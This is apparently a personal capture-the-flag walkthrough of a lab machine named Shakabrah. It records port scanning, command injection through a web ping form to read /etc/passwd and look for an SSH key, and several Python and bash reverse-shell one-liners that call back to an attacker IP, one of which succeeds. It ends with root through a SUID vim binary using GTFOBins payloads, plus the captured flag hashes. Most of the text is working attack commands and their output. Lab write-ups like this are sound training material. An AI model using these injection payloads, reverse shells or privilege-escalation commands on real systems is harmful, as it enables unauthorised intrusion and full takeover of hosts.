#Enumeration

Target IP given is: 192.168.239.86

Got OpenVAS working just for fun via docker. Only able to check the services and their versions for CVE's. No deep auto webapp vuln checking or exploitation from default scans.

## Nmap

nmap -p- -sV -sC --open -T4 192.168.239.86 -oN shakabrah_nmap.txt

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 16:57 GMT                              

Nmap scan report for 192.168.239.86                                                          

Host is up (0.053s latency).                                                                 

Not shown: 65533 filtered tcp ports (no-response)                                            

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit                  

PORT   STATE SERVICE VERSION                                                                 

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)            

| ssh-hostkey:                                                                               

|   2048 33b96d350bc5c45a86e0261095487782 (RSA)                                              

|   256 a80fa7738302c1978c25bafea5115f74 (ECDSA)                                             

|_  256 fce99ffef9e04d2d76eecadaafc3399e (ED25519)                                           

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                          

|_http-server-header: Apache/2.4.29 (Ubuntu)                                                 

|_http-title: Site doesn't have a title (text/html; charset=UTF-8).                          

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                      

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                            

Nmap done: 1 IP address (1 host up) scanned in 167.03 seconds 

  

##Dirbuster

Using /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

Starting OWASP DirBuster 1.0-RC1

Starting dir/file list based brute forcing

File found: /index.php - 200

Dir found: / - 200

Dir found: /icons/ - 403

Dir found: /icons/small/ - 403

Nothing of note

  

##Site

It's a ping connection tester

[https://i.imgur.com/pI8h8AF.png](https://i.imgur.com/pI8h8AF.png)

Maybe I can do command injection / RCE

Running command behind ping

127.0.0.1 && cat /usr/passwd 

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.

64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms

64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.022 ms

64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.037 ms

64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.028 ms

  

--- 127.0.0.1 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 3062ms

rtt min/avg/max/mdev = 0.022/0.028/0.037/0.007 ms

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin

systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin

syslog:x:102:106::/home/syslog:/usr/sbin/nologin

messagebus:x:103:107::/nonexistent:/usr/sbin/nologin

_apt:x:104:65534::/nonexistent:/usr/sbin/nologin

lxd:x:105:65534::/var/lib/lxd/:/bin/false

uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin

dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin

landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin

sshd:x:109:65534::/run/sshd:/usr/sbin/nologin

pollinate:x:110:1::/var/cache/pollinate:/bin/false

dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash

  

etc/shadow doesn't return anything

  

Maybe the ssh key for dylan

127.0.0.1 && cat /home/dylan/.ssh/id_rsa

Nope. Maybe a python reverse shell. 

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)

python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("192.168.45.223",4444));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'

Nope. Maybe another one

  

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.223",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Nope. To confirm the connection

  

127.0.0.1; whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.

64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.023 ms

64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.038 ms

64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms

64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.042 ms

  

--- 127.0.0.1 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 3069ms

rtt min/avg/max/mdev = 0.023/0.035/0.042/0.008 ms

www-data

  

Ok now will try with other reverse shells. If not maybe it's python3

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.223",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

So python isn't working. A bash rev shell should work though.

  

/bin/bash -l > /dev/tcp/192.168.45.223/4444 0<&1 2>&1

no dice. Maybe

sh -i >& /dev/udp/192.168.45.223/4444 0>&1

Great site for this: [https://www.revshells.com/](https://www.revshells.com/)

  

uname -a 

Linux shakabrah 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

  

suggested to try python 3 #2. Also suggested to run it over port 80 since it's already open

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.223",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

  

Works

 ⚠   kali  🏡                                                                                                     

 →  nc -nlvp 80                                                                                            18:09:16

listening on [any] 80 ...

connect to [192.168.45.223] from (UNKNOWN) [192.168.239.86] 51928

www-data@shakabrah:/var/www/html$ 

www-data@shakabrah:/var$ cd

ls

cd

bash: cd: HOME not set

www-data@shakabrah:/var$ ls

backups  crash  local  log   opt  snap   tmp

cache    lib    lock   mail  run  spool  www

www-data@shakabrah:/var$ ls

ls

backups  crash  local  log   opt  snap   tmp

cache    lib    lock   mail  run  spool  www

www-data@shakabrah:/var$ cd /home       

cd /home

www-data@shakabrah:/home$ ls

ls

dylan

www-data@shakabrah:/home$ cd dylan

cd dylan

www-data@shakabrah:/home/dylan$ ls

ls

local.txt

www-data@shakabrah:/home/dylan$ cat local.txt

cat local.txt

1f3b503a98dbaf166ee1e519c07edfd2

  

#Privilege Escalation

sudo -l prompts a password...

No .ssh profile for dylan

SUID program search

www-data@shakabrah:/home/dylan$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null

  

< -perm -4000 -type f -exec ls -al {} \; 2>/dev/null

-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo

-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec

-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd

-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn

-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils

-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at

-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh

-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp

-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd

-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap

-rwsr-xr-x 1 root root 2675336 Mar 18  2020 /usr/bin/vim.basic

-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap

  

-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device

-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign

-rwsr-xr-x 1 root root 100760 Nov 22  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

-rwsr-xr-x 1 root root 113528 Jul 10  2020 /usr/lib/snapd/snap-confine

-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1

-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount

-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount

-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping

-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount

-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su

So VIM

[https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/)

  

Running any of the things causes it to bug out a bit

$ vim -c ':py3 import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'

E79: Cannot expand wildcardsm ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'

  

E79: Cannot expand wildcards

  

E79: Cannot expand wildcards

  

E79: Cannot expand wildcards

  

E79: Cannot expand wildcards

  

E79: Cannot expand wildcards

  

E79: Cannot expand wildcards

  

E79: Cannot expand wildcards

  

E79: Cannot expand wildcards

  

E79: Cannot expand wildcards

  

E79: Cannot expand wildcards

  

E79: Cannot expand wildcards

  

-- More --  

So to make this work I'll refer to the same vim.basic location then run the command 

  

/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh -p")'

E79: Cannot expand wildcards

-- More --                                                                                                                                                                             

Press ENTER or type command to continuereset: unknown terminal type unknown

Terminal type?   

  

xterm or eterm bypasses this.

  

No dice though so trying another vim privesc

  

/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

E79: Cannot expand wildcards

-- More --   

E79: Cannot expand wildcards

-- More --   

E79: Cannot expand wildcards

-- More --   

E79: Cannot expand wildcards

-- More --   

E79: Cannot expand wildcards

-- More --   

E79: Cannot expand wildcards

-- More --                                                           

Press ENTER or type command to continuereset: unknown terminal type unknown

Terminal type?  xterm

# whoami

whoami

root

# ls

ls

index.php

# cd

cd

# ls

ls

index.php

# cd /root

cd /root

# ls

ls

proof.txt

# cat proof.txt 

cat proof.txt

88fbe377debfc7cf6b05bef1aa348e80

Boot2Root